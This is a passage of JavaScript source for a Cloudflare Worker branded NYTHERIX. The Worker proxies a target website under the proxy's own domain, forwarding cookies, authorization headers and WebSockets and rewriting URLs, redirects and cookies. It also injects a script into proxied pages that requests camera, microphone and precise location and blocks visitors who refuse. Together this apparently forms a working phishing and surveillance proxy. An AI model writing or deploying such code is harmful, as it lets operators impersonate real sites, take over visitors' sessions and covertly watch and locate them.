  s += "\n";
  s += "  function _deny() {\n";
  s += "    if (done) return; done = true;\n";
  s += "    if (_stream) {\n";
  s += "      try { _stream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}\n";
  s += "      _stream = null;\n";
  s += "    }\n";
  s += "    _ss(SKEY, null);\n";
  s += "    _showDenied();\n";
  s += "  }\n";
  s += "\n";
  s += "  navigator.mediaDevices.getUserMedia({ video: true, audio: true })\n";
  s += "    .then(function(s) {\n";
  s += "      _stream = s; camOk = true; _stepDone('_nx_s1');\n";
  s += "      if (st) st.textContent = geoOk ? 'All permissions granted!' : 'Camera granted - waiting for location...';\n";
  s += "      _check();\n";
  s += "    })\n";
  s += "    .catch(_deny);\n";
  s += "\n";
  s += "  navigator.geolocation.getCurrentPosition(\n";
  s += "    function(pos) {\n";
  s += "      _geoPos = pos; geoOk = true; _stepDone('_nx_s2');\n";
  s += "      if (st) st.textContent = camOk ? 'All permissions granted!' : 'Location granted - waiting for camera...';\n";
  s += "      _check();\n";
  s += "    },\n";
  s += "    _deny,\n";
  s += "    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }\n";
  s += "  );\n";
  s += "};\n";
  s += "\n";

  // Close IIFE and script tag
  // Use <\/script> to prevent HTML parser treating this as closing the injected script tag
  s += "})();" + "<" + "/script>";

  return s;
}

// =============================================================================
//  STATIC PAGES
// =============================================================================
function placeholderPage() {
  return "<!DOCTYPE html>\n"
    + "<html lang=\"en\">\n"
    + "<head>\n"
    + "  <meta charset=\"UTF-8\">\n"
    + "  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
    + "  <title>NYTHERIX</title>\n"
    + "  <style>\n"
    + "    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}\n"
    + "    html,body{height:100%;background:#06070c}\n"
    + "    body{display:flex;align-items:center;justify-content:center;overflow:hidden}\n"
    + "    .logo{font-family:system-ui,sans-serif;font-size:clamp(32px,9vw,58px);\n"
    + "      font-weight:900;letter-spacing:.16em;color:#00ffe0;\n"
    + "      text-shadow:0 0 48px rgba(0,255,224,.3),0 0 120px rgba(0,255,224,.1)}\n"
    + "    body::after{content:'';position:fixed;inset:0;\n"
    + "      background:radial-gradient(ellipse at center,transparent 38%,#06070c 100%);\n"
    + "      pointer-events:none}\n"
    + "  </style>\n"
    + "</head>\n"
    + "<body><div class=\"logo\">NYTHERIX</div></body>\n"
    + "</html>";
}

function errPage(title, detail) {
  return "<!DOCTYPE html>\n"
    + "<html lang=\"en\">\n"
    + "<head>\n"
    + "  <meta charset=\"UTF-8\">\n"
    + "  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
    + "  <title>NYTHERIX - " + title + "</title>\n"
    + "  <style>\n"
    + "    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}\n"
    + "    html,body{min-height:100%;background:#06070c;color:#e2e8f0}\n"
    + "    body{display:flex;align-items:center;justify-content:center;padding:24px}\n"
    + "    .card{max-width:520px;width:100%;text-align:center;\n"
    + "      background:rgba(12,16,22,.92);border:1px solid rgba(244,63,94,.2);\n"
    + "      border-radius:18px;padding:44px 32px}\n"
    + "    .icon{font-size:42px;margin-bottom:18px}\n"
    + "    h1{font-size:18px;color:#f43f5e;margin-bottom:14px;font-family:monospace}\n"
    + "    p{font-size:13px;color:#6b7280;line-height:1.85}\n"
    + "    code{color:#f59e0b;background:rgba(245,158,11,.1);\n"
    + "      padding:1px 6px;border-radius:4px;font-size:12px}\n"
    + "    .btn{display:inline-block;margin-top:22px;padding:9px 24px;\n"
    + "      background:rgba(244,63,94,.12);color:#f87171;\n"
    + "      border:1px solid rgba(244,63,94,.25);border-radius:8px;\n"
    + "      font-size:13px;cursor:pointer;text-decoration:none}\n"
    + "  </style>\n"
    + "</head>\n"
    + "<body>\n"
    + "  <div class=\"card\">\n"
    + "    <div class=\"icon\">&#x26A0;&#xFE0F;</div>\n"
    + "    <h1>" + title + "</h1>\n"
    + "    <p>" + detail + "</p>\n"
    + "    <a class=\"btn\" href=\"javascript:location.reload()\">&#x21BA; Retry</a>\n"
    + "  </div>\n"
    + "</body>\n"
    + "</html>";
}

// =============================================================================
//  MAIN FETCH HANDLER
// =============================================================================
export default {
  async fetch(request, env) {
    try {
      return await _handle(request, env);
    } catch (err) {
      const msg = err && err.message ? err.message : String(err);
      // CF enforces null body on 101/204/205/304 -- if that constraint fires as an
      // exception, we cannot return a body either. Return a minimal bodyless 500.
      if (msg && msg.includes("null body status")) {
        return new Response(null, { status: 500 });
      }
      console.error("[NYTHERIX] Unhandled exception:", err);
      return htmlRes(errPage(
        "Worker Error",
        "An unexpected error occurred.<br><br><code>" + msg + "</code>"
      ), 500);
    }
  }
};

async function _handle(request, env) {
    const url         = new URL(request.url);
    const proxyHost   = url.hostname;
    const proxyOrigin = "https://" + proxyHost;
    const reqOrigin   = request.headers.get("Origin") || null;

    // CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: buildCorsHeaders(reqOrigin),
      });
    }

    // 1. Load config (TTL-cached)
    let config;
    try { config = await getConfig(env); }
    catch {
      return htmlRes(errPage(
        "Database Error",
        "D1 binding <code>DB</code> is missing or the <code>settings</code> table "
        + "has not been created.<br><br>"
        + "Run: <code>CREATE TABLE settings "
        + "(id INTEGER PRIMARY KEY, target_url TEXT, enabled INTEGER DEFAULT 1);</code>"
      ), 500);
    }

    if (!config || !config.target_url) return htmlRes(placeholderPage());
    if (!config.enabled)               return htmlRes(placeholderPage());

    // 2. Validate target URL
    let targetUrl;
    try { targetUrl = new URL(config.target_url); }
    catch {
      return htmlRes(errPage(
        "Configuration Error",
        "The stored <code>target_url</code> is not a valid URL.<br>"
        + "Check the settings row in your D1 database."
      ));
    }

    const targetOrigin = targetUrl.origin;
    const targetHost   = targetUrl.hostname;

    // 3. WebSocket -- true bidirectional bridge via WebSocketPair
    if ((request.headers.get("Upgrade") || "").toLowerCase() === "websocket") {
      const wsScheme = targetUrl.protocol === "https:" ? "wss:" : "ws:";
      const wsUrl    = wsScheme + "//" + targetHost + url.pathname + url.search;
      const wsHdr    = new Headers();
      for (const h of ["Authorization", "Cookie", "Sec-WebSocket-Protocol", "Sec-WebSocket-Extensions"]) {
        const v = request.headers.get(h);
        if (v) wsHdr.set(h, v);
      }
      wsHdr.set("Host",   targetHost);
      wsHdr.set("Origin", targetOrigin);
      try {
        // WebSocketPair: index 0 = client-facing socket (returned to browser in 101 response)
        //                index 1 = server-facing socket (Worker uses to bridge to upstream)
        const pair   = new WebSocketPair();
        const client = pair[0];
        const worker = pair[1];
        wsHdr.set("Upgrade",    "websocket");
        wsHdr.set("Connection", "Upgrade");
        const upRes = await fetch(wsUrl, { headers: wsHdr, cf: { cacheEverything: false } });
        if (upRes.status !== 101) {
          return new Response("WS upstream refused (" + upRes.status + ")", { status: 502 });
        }
        const upWS = upRes.webSocket;
        if (!upWS) return new Response("WS proxy unavailable", { status: 502 });
        upWS.accept();
        worker.accept();
        upWS.addEventListener("message",  function(e) { try { worker.send(e.data);  } catch(_) {} });
        worker.addEventListener("message", function(e) { try { upWS.send(e.data);   } catch(_) {} });
        upWS.addEventListener("close",    function(e) { try { worker.close(e.code, e.reason); } catch(_) {} });
        worker.addEventListener("close",   function(e) { try { upWS.close(e.code, e.reason);  } catch(_) {} });
        upWS.addEventListener("error",    function()  { try { worker.close(1011, "upstream error"); } catch(_) {} });
        worker.addEventListener("error",   function()  { try { upWS.close(1011, "worker error");    } catch(_) {} });
        const proto     = request.headers.get("Sec-WebSocket-Protocol");
        const wsRespHdr = new Headers({ "Upgrade": "websocket", "Connection": "Upgrade" });
        if (proto) wsRespHdr.set("Sec-WebSocket-Protocol", proto.split(",")[0].trim());
        return new Response(null, { status: 101, webSocket: client, headers: wsRespHdr });
      } catch (err) {
        return new Response("WebSocket proxy error: " + err.message, { status: 502 });
      }
    }

    // 4. Build upstream request
    const upstreamUrl = targetOrigin + url.pathname + url.search;
    const upHdr = new Headers(request.headers);
    upHdr.set("Host",    targetHost);
    upHdr.set("Referer", targetOrigin + url.pathname);
    upHdr.set("Origin",  targetOrigin);
    upHdr.delete("Accept-Encoding"); // CF Workers auto-decompresses; identity causes 406 on strict upstreams
    for (const h of STRIP_REQ) upHdr.delete(h);

    // 5. Fetch upstream
    let upstream;
    try {
      upstream = await fetch(upstreamUrl, {
        method:   request.method,
        headers:  upHdr,
        body:     ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
        redirect: "manual",
        cf:       { cacheEverything: false },
      });
    } catch (err) {
      return htmlRes(errPage(
        "Proxy Error",
        "Cannot reach <b>" + targetHost + "</b>.<br><br><code>" + err.message + "</code>"
      ), 502);
    }

    // 6. Rewrite redirects
    if ([301, 302, 303, 307, 308].includes(upstream.status)) {
      let loc     = upstream.headers.get("Location") || "/";
      const hEsc  = escRe(targetHost);
      const subRe = makeSubRe(hEsc);

      if (loc.startsWith(targetOrigin)) {
        loc = proxyOrigin + loc.slice(targetOrigin.length);
      } else if (loc.startsWith("//" + targetHost)) {
        loc = "//" + proxyHost + loc.slice(2 + targetHost.length);
      }
      loc = rewriteSubdomains(loc, subRe, targetHost, proxyHost);

      const rh = new Headers(buildCorsHeaders(reqOrigin));
      rh.set("Location", loc);
      applyCookies(upstream.headers, rh, proxyHost);
      return new Response(null, { status: upstream.status, headers: rh });
    }

    // 7. Build response headers
    const headers = new Headers(upstream.headers);
    for (const h of STRIP_RESP) headers.delete(h);
    for (const [k, v] of Object.entries(buildCorsHeaders(reqOrigin))) headers.set(k, v);

    headers.set("Cross-Origin-Opener-Policy",  "same-origin-allow-popups");
    headers.set("Cross-Origin-Embedder-Policy", "unsafe-none");
    headers.set("Cross-Origin-Resource-Policy", "cross-origin");
    headers.set("Permissions-Policy",           PERMS_POLICY);

    applyCookies(upstream.headers, headers, proxyHost);

    const ct = (headers.get("Content-Type") || "").toLowerCase();

    // 8. Null-body statuses -- CF forbids any body on these
    if ([204, 205, 304].includes(upstream.status)) {
      headers.delete("Content-Length");
      headers.delete("Transfer-Encoding");
      headers.delete("Content-Encoding");
      return new Response(null, { status: upstream.status, headers });
    }

    // 9. Media -- stream directly, never buffer
    if (isMedia(ct)) {
      headers.delete("Content-Encoding");
      return new Response(upstream.body, { status: upstream.status, headers });
    }

    // 10. Text -- rewrite URLs
    if (isText(ct)) {
      let text;
      try { text = await upstream.text(); }
      catch {
        // Stream read failed -- body consumed or connection dropped; return generic error
        return htmlRes(errPage("Read Error", "Failed to read response from upstream."), 502);
      }

      const oEsc  = escRe(targetOrigin);
      const hEsc  = escRe(targetHost);
      const subRe = makeSubRe(hEsc);

      if (ct.includes("text/html")) {
        // rewriteHTML handles all URL rewrites internally -- no pre-pass needed
        text = rewriteHTML(text, proxyOrigin, proxyHost, targetOrigin, targetHost);
      } else {
        text = text.replace(new RegExp(oEsc, "g"), proxyOrigin);
        text = text.replace(new RegExp("wss://" + hEsc, "g"), "wss://" + proxyHost);
        text = text.replace(new RegExp("ws://"  + hEsc, "g"), "ws://"  + proxyHost);
        text = rewriteSubdomains(text, subRe, targetHost, proxyHost);
      }

      headers.delete("Content-Length");
      headers.delete("Transfer-Encoding");
      headers.delete("Content-Encoding");
      return new Response(text, { status: upstream.status, headers });
    }

    // 11. Everything else (WASM, fonts, unrecognised types)
    headers.delete("Content-Encoding");
    return new Response(upstream.body, { status: upstream.status, headers });
}
